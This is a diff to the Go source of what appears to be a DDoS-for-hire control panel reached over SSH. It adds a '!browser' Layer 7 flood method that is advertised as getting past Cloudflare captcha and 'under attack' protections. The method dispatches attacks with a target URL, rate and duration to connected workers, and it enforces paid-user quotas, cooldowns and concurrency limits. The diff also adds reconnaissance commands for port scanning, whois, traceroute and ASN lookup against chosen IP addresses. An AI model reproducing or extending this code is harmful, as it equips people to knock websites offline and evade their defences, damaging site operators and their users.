@@ -2,12 +2,14 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
 	"math/rand"
 	"net"
 	"strconv"
 	"strings"
 	"time"
 
+	"net/http"
 	"net/url"
 
 	"github.com/alexeyco/simpletable"
@@ -559,6 +561,7 @@ func AdminSSH(conn net.Conn) {
 		case "methods_layer7", "methods_l7":
 			rows := [][]string{
 				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
+				{"!browser", ansiCommands + "Browser emulation optimized for CF Captcha & UAM" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
 
@@ -1014,6 +1017,9 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users max_daily status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, days, ansiSuccess, ansiReset)))
 			continue
 
+			// Add days to a user's account
+			//============================================================================================================================================================================================================================================================================//
+
 		case "days":
 
 			if !session.User.Admin {
@@ -1059,7 +1065,10 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users expiry status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, days, ansiSuccess, ansiReset)))
 			continue
 
-		case "create": // Creates a new user
+			// Create a new user
+			//============================================================================================================================================================================================================================================================================//
+
+		case "create":
 			if !session.User.Admin && !session.User.Reseller {
 				session.Conn.Write([]byte(ansiWarning + "Only admins/resellers can currently create users!" + ansiReset + "\r\n"))
 				continue
@@ -1109,6 +1118,9 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(ansiSuccess + "User created successfully" + ansiReset + "\r\n"))
 			continue
 
+			// Remove an existing user
+			//============================================================================================================================================================================================================================================================================//
+
 		case "remove":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
@@ -1143,6 +1155,9 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(ansiSuccess + "Removed the user!" + ansiReset + "\r\n"))
 			continue
 
+			// Broadcast a message to all connected clients
+			//============================================================================================================================================================================================================================================================================//
+
 		case "broadcast":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
@@ -1162,6 +1177,9 @@ func AdminSSH(conn net.Conn) {
 			}
 			session.Conn.Write([]byte(ansiSuccess + "Broadcast sent\r\n" + ansiReset))
 			continue
+
+			// Users command to see all users in the database and their info
+			//============================================================================================================================================================================================================================================================================//
 
 		case "users":
 			if !session.User.Admin {
@@ -1211,6 +1229,9 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
 			continue
 
+			// Ongoing attacks command to see all ongoing attacks and their info
+			//============================================================================================================================================================================================================================================================================//
+
 		case "ongoing": // Global ongoing attacks
 
 			new := simpletable.New()
@@ -1247,6 +1268,9 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
 			continue
 
+			// Sessions command to see all connected sessions and their info
+			// //============================================================================================================================================================================================================================================================================//
+
 		case "sessions":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
@@ -1282,6 +1306,411 @@ func AdminSSH(conn net.Conn) {
 			colored := colorTableBorders(new.String())
 			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
 			continue
+
+			// Functions//
+			// ==========================================================================================================================================================================================================================================================================//
+
+			// IP lookup command to get geolocation information about an IP address using the hackertarget API
+			//============================================================================================================================================================================================================================================================================//
+
+		case "iplookup":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Lookup geolocation information for an IP address\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": iplookup <ip>\r\n"))
+				continue
+			}
+
+			ipAddress := args[0]
+
+			url := "https://api.hackertarget.com/geoip/?q=" + ipAddress
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 5 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to lookup IP. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+			// Port scan command to scan for open ports on an IP address using the hackertarget API
+			//============================================================================================================================================================================================================================================================================//
+
+		case "portscan":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Perform a port scan on an IP address\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": portscan <ip>\r\n"))
+				continue
+			}
+
+			ipAddress := args[0]
+
+			url := "https://api.hackertarget.com/nmap/?q=" + ipAddress
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 5 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to scan ports. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+		// Whois command to lookup WHOIS information for an IP address using the hackertarget API
+		//============================================================================================================================================================================================================================================================================//
+
+		case "whois":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Lookup WHOIS information for an IP address\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": whois <ip>\r\n"))
+				continue
+			}
+
+			ipAddress := args[0]
+
+			url := "https://api.hackertarget.com/whois/?q=" + ipAddress
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 5 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to lookup WHOIS. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+		// Ping command to perform a ping on an IP address using the hackertarget API
+		//============================================================================================================================================================================================================================================================================//
+
+		case "ping":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Perform a ping on an IP address\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": ping <ip>\r\n"))
+				continue
+			}
+
+			ipAddress := args[0]
+
+			url := "https://api.hackertarget.com/nping/?q=" + ipAddress
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 5 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to ping. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+		// Traceroute command to perform a traceroute on an IP address using the hackertarget API
+		//============================================================================================================================================================================================================================================================================//
+
+		case "traceroute":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Perform a traceroute on an IP address\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": traceroute <ip>\r\n"))
+				continue
+			}
+
+			ipAddress := args[0]
+
+			url := "https://api.hackertarget.com/mtr/?q=" + ipAddress
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 60 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to traceroute. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+		// Resolve command to resolve the IP addresses associated with a domain using the hackertarget API
+		//============================================================================================================================================================================================================================================================================//
+
+		case "resolve":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Resolve DNS for a domain\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": resolve <domain>\r\n"))
+				continue
+			}
+
+			domain := args[0]
+
+			url := "https://api.hackertarget.com/hostsearch/?q=" + domain
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 15 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to resolve domain. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+		// Reverse DNS lookup command to get the domain associated with an IP address using the hackertarget API
+		//============================================================================================================================================================================================================================================================================//
+
+		case "reversedns":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Perform a reverse DNS lookup on an IP address\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": reversedns <ip>\r\n"))
+				continue
+			}
+
+			ipAddress := args[0]
+
+			url := "https://api.hackertarget.com/reverseiplookup/?q=" + ipAddress
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 5 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to lookup reverse DNS. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+		// ASN lookup command to lookup ASN information for an IP address using the hackertarget API
+		//============================================================================================================================================================================================================================================================================//
+
+		case "asnlookup":
+			args := strings.Fields(command)[1:]
+
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Lookup ASN information for an IP address\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": asnlookup <ip>\r\n"))
+				continue
+			}
+
+			ipAddress := args[0]
+
+			url := "https://api.hackertarget.com/aslookup/?q=" + ipAddress
+			tr := &http.Transport{
+				ResponseHeaderTimeout: 15 * time.Second,
+				DisableCompression:    true,
+			}
+			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
+			response, err := client.Get(url)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to lookup ASN. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseData, err := ioutil.ReadAll(response.Body)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to read response. Please try again later." + ansiReset + "\r\n"))
+				continue
+			}
+
+			responseString := string(responseData)
+			formatted := strings.ReplaceAll(responseString, "\n", "\r\n")
+			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
+			continue
+
+			//BROWSER	CASE
+			//============================================================================================================================================================================================================================================================================//
+
+		case "!browser":
+			args := strings.Fields(command)
+			if len(args) < 4 {
+				session.Conn.Write([]byte(ansiError + "Usage: !browser <url> <rate> <time>" + ansiReset + "\r\n"))
+				continue
+			}
+			url := args[1]
+			rate, err := strconv.Atoi(args[2])
+			if err != nil || rate < 1 || rate > 250 {
+				session.Conn.Write([]byte(ansiError + "Rate must be 1-250" + ansiReset + "\r\n"))
+				continue
+			}
+			duration, err := strconv.Atoi(args[3])
+			if err != nil || duration <= 0 {
+				session.Conn.Write([]byte(ansiError + "Invalid duration" + ansiReset + "\r\n"))
+				continue
+			}
+			if duration > session.User.Maxtime {
+				session.Conn.Write([]byte(fmt.Sprintf(ansiError+"Duration exceeds your maxtime (%d seconds)"+ansiReset+"\r\n", session.User.Maxtime)))
+				continue
+			}
+
+			// Límite diario
+			sent, err := UserOngoingAttacks(session.User.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
+			if err == nil && len(sent) >= session.User.MaxDaily && !session.User.Admin {
+				session.Conn.Write([]byte(ansiError + "Daily attack limit exceeded" + ansiReset + "\r\n"))
+				continue
+			}
+
+			// Cooldown
+			thererunning, _ := UserOngoingAttacks(session.User.Username, time.Now())
+			if len(thererunning) > 0 && session.User.Cooldown > 0 {
+				recent := thererunning[0]
+				for _, a := range thererunning {
+					if a.Sent > recent.Sent {
+						recent = a
+					}
+				}
+				if recent.Sent+int64(session.User.Cooldown) > time.Now().Unix() {
+					session.Conn.Write([]byte(ansiError + "You are in cooldown" + ansiReset + "\r\n"))
+					continue
+				}
+			}
+
+			// Límite de ataques concurrentes (para este usuario)
+			running, err := UserOngoingAttacks(session.User.Username, time.Now())
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Error checking concurrent attacks" + ansiReset + "\r\n"))
+				continue
+			}
+			if session.User.Conns > 0 && len(running) >= session.User.Conns {
+				session.Conn.Write([]byte(ansiError + "Concurrent attack limit exceeded" + ansiReset + "\r\n"))
+				continue
+			}
+
+			// Límite global de ataques simultáneos
+			globalRunning, err := OngoingAttacks(time.Now())
+			if err != nil || len(globalRunning) >= Options.Templates.Attacks.MaximumOngoing {
+				session.Conn.Write([]byte(ansiError + "Maximum global attack slots reached" + ansiReset + "\r\n"))
+				continue
+			}
+
+			// Comprobar que hay workers conectados
+			workersMux.RLock()
+			workerCount := len(workers)
+			workersMux.RUnlock()
+			if workerCount == 0 {
+				session.Conn.Write([]byte(ansiError + "No L7 workers available" + ansiReset + "\r\n"))
+				continue
+			}
+
+			// Enviar comando a todos los workers
+			cmd := map[string]interface{}{
+				"type":     "attack",
+				"method":   "browser",
+				"url":      url,
+				"rate":     rate,
+				"duration": duration,
+				"user":     session.User.Username,
+			}
+			SendToWorkers(cmd)
+
+			// Registrar ataque en la base de datos (opcional)
+			if err := LogAttack(&AttackLog{
+				Target:   url,
+				Duration: duration,
+				Flags:    fmt.Sprintf("rate=%d", rate),
+				Sent:     time.Now().Unix(),
+				Finish:   time.Now().Add(time.Duration(duration) * time.Second).Unix(),
+				User:     session.User.Username,
+				Devices:  0, // No se usan bots
+			}); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to log attack" + ansiReset + "\r\n"))
+				continue
+			}
+			face := purpleGradientText("X_X")
+			session.Conn.Write([]byte(ansiSuccess + "Successfully" + ansiReset + " " + ansiCommands + "sent attack to " + url + " for " + strconv.Itoa(duration) + " seconds with rate " + strconv.Itoa(rate) + " using " + strconv.Itoa(workerCount) + " servers" + ansiReset + face + ansiReset + "\r\n"))
+
+			continue
+
+			//Default case handles attack commands and unknown commands
+			//============================================================================================================================================================================================================================================================================//
 
 		default:
 
